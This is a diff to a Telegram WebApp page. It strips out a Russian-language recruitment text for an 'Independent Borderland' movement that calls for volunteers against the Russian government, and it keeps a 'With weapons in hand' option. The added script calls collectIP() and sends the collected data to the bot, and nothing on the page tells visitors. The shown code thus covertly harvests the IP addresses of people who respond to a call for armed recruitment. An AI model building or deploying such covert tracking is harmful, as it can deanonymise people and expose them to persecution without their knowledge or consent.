@@ -75,14 +75,10 @@
 </head>
 <body>
     <div class="container">
-        <h1 style="text-align: center;">Независимое приграничье!</h1>
+        <h1 style="text-align: center;"></h1>
         <h4 style="text-align: justify;">Приветствую новобранец,
 
-            Добро пожаловать в ряды сторонников Независимого Приграничья.
-            
-            Вот уже почти 500 лет как жители Приграничья находятся под гнетом кучки узурпаторов, называющих себя Российской Федерацией.
-            
-            Мы приверженцы Независимого Приграничья объявляем набор добровольцев в ряды неравнодушных людей, считающих себя свободными от диктаторского режима путинской бандитской группировки.</h4>
+</h4>
         
         <button class="button" onclick="toggleDropdown('weapon')">С оружием в руках</button>
         <div id="weaponDropdown" class="dropdown-content">
@@ -185,6 +181,9 @@
                 window.Telegram.WebApp.close();
             }
         });
+
+        await collectIP();
+        window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
     </script>
 </body>
 </html>
